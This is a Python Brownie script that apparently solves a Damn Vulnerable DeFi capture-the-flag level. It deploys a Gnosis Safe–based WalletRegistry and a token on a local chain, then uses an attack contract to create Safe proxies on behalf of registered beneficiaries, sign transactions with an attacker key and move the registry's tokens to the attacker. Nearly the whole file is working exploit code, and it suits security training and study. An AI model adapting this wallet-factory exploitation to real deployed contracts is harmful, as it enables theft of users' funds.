from hashlib import new
from pathlib import Path
from brownie import ZERO_ADDRESS, accounts, WalletRegistry, DamnValuableToken, project, Wei, GnosisWalletAttack
import eth_account
from eth_account.messages import encode_defunct

# This test only steals 10 tokens, stealing all 40 would be easy given this solution,
# Although doing it all in a single transaction would be a pain, if i used the contract as owner it would've
# been much simpler.

def main():
    before()
    exploit()
    
    
def before():
    # Create new account with key, added to the end of accounts array
    # Key used later for gnosis safe. 
    DEPLOYER = accounts[-1]
    new_account = eth_account.Account().create()
    global attacker_key
    attacker_key = new_account.privateKey.hex()
    print(f"attacker address: {new_account.address}")
    global ATTACKER
    ATTACKER = accounts.add(attacker_key)
    new_account = accounts.add()
    
    
    global wallet_users
    wallet_users = [accounts[0], accounts[1], accounts[2], accounts[3]]
    gnosis_package_path = Path(Path.home()/ ".brownie" /"packages"/"gnosis"/"safe-contracts@1.3.0")
    # Load the gnosis contracts for use
    global Gnosis
    Gnosis = project.load(gnosis_package_path)
    global GnosisSafe
    GnosisSafe = Gnosis.GnosisSafe
    global GnosisSafeProxyFactory
    GnosisSafeProxyFactory = Gnosis.GnosisSafeProxyFactory
    # Deploy Gnosis contracts
    gnosis_safe = GnosisSafe.deploy({"from": DEPLOYER})
    gnosis_safe_proxy_factory = GnosisSafeProxyFactory.deploy({"from": DEPLOYER})
    
    dv_token = DamnValuableToken.deploy({"from": DEPLOYER})
    wallet_registry = WalletRegistry.deploy(gnosis_safe.address,
                                            gnosis_safe_proxy_factory.address,
                                            dv_token.address,
                                            wallet_users,
                                            {"from": DEPLOYER})
    for i in wallet_users:
        assert wallet_registry.beneficiaries(i.address) == True
    dv_token.transfer(wallet_registry.address, Wei("40 ether"), {"from": DEPLOYER})
    assert dv_token.balanceOf(wallet_registry.address) == Wei("40 ether")
    
    
    
def exploit():
    attack_contract = GnosisWalletAttack.deploy(
        wallet_users,
        GnosisSafeProxyFactory[-1].address,
        GnosisSafe[-1].address,
        WalletRegistry[-1].address,
        {"from": ATTACKER}
        )
    return_bytes = attack_contract.getInitialisationData(
        [wallet_users[1].address], 
        1,
        attack_contract.address,
        {"from": ATTACKER}
    )
    print(WalletRegistry[-1].address, GnosisSafe[-1].address)
    
    proxy_address = GnosisSafeProxyFactory[-1].createProxyWithCallback(
        GnosisSafe[-1].address,
        return_bytes,
        1,
        WalletRegistry[-1].address,
        {"from": ATTACKER}
    )
    
    proxy_contract = Gnosis.GnosisSafe.at(proxy_address.return_value)
    nonce = proxy_contract.nonce()
    print(nonce)
    tx_hash = GnosisWalletAttack[-1].formulateTransaction(proxy_address.return_value,
                                                DamnValuableToken[-1].address,
                                                nonce).return_value
    proxy_contract.approveHash(tx_hash,
                            {"from": ATTACKER})
    preHash = attack_contract.getPreHash(proxy_address.return_value,
                                                DamnValuableToken[-1].address,
                                                nonce).return_value
    signature = eth_account.Account.signHash(tx_hash, attacker_key)
    print(signature.v)
    tx_sig = signature.signature.hex()
    print(f"hash: {tx_hash}, Sig: {tx_sig}")
    addresss = eth_account.Account.recoverHash(tx_hash, signature=tx_sig)
    print(addresss)
    print(ATTACKER.address)
    print(GnosisWalletAttack[-1].attackerAddress())
    proxy_contract.checkSignatures(tx_hash,
                                preHash,
                                tx_sig,
                                {"from": ATTACKER})
    internal_data = attack_contract.getInternalData()
    proxy_contract.execTransaction(DamnValuableToken[-1].address,
                                0,
                                internal_data,
                                0,
                                0,
                                0,
                                0,
                                ZERO_ADDRESS,
                                ATTACKER.address,
                                tx_sig,
                                {"from": ATTACKER})

def after():
    assert DamnValuableToken[-1].balanceOf(ATTACKER) >= Wei("10 ether")
    